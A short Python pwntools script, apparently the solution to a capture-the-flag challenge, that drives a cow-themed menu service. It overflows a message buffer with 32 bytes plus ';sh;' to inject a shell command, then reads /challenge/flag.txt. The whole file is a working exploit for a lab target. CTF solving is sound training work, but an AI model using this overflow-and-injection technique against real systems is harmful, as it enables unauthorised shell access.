from pwn import *
import sys

def main(ip, port):
    r = connect(ip, port)

    # nouvelle créature
    r.sendlineafter(b"> ", b"n")

    # se retransformer en vache
    r.sendlineafter(b"> ", b"v")

    # meuh
    r.sendlineafter(b"> ", b"m")
    r.sendlineafter(b"Message : ", b"A"*32 + b";sh;")

    # roaaar
    r.sendlineafter(b"> ", b"r")

    r.sendline(b"cat /challenge/flag.txt")
    print(r.recvall(timeout=1))

if __name__ == "__main__":
    ip = sys.argv[1]
    port = int(sys.argv[2])
    main(ip, port)
